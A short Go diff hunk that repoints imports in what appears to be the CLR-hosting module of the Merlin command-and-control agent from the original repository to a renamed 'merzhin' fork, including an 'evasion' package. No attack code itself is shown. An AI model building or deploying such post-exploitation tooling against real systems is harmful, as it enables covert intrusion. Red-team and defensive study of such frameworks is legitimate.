@@ -13,12 +13,12 @@ import (
 	clr "github.com/Ne0nd0g/go-clr"
 
 	// Merlin Main
-	"github.com/Ne0nd0g/merlin/pkg/jobs"
+	"github.com/testtoto1337/merzhin/pkg/jobs"
 
 	// Internal
-	"github.com/Ne0nd0g/merlin-agent/cli"
-	"github.com/Ne0nd0g/merlin-agent/core"
-	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/evasion"
+	"github.com/testtoto1337/merzhin-agent/cli"
+	"github.com/testtoto1337/merzhin-agent/core"
+	"github.com/testtoto1337/merzhin-agent/os/windows/pkg/evasion"
 )
 
 // runtimeHost is the main object used to interact with the CLR to load and invoke assemblies
